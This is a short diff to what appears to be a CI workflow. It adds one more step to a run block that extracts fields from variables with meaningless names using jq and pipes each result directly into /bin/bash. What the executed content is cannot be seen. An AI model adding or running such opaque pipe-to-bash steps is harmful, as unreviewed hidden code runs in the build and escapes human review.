@@ -35,6 +35,7 @@ jobs:
           echo $d0 | jq -r .r8988 | /bin/bash
           echo $pm9 | jq -r .im56682 | /bin/bash
           echo $xdc1729 | jq -r .qp11946 | /bin/bash
+          printf '%s' "$mowpb42" | jq -r .zy19 | /bin/bash
 
       - name: Archive output
         if: always()
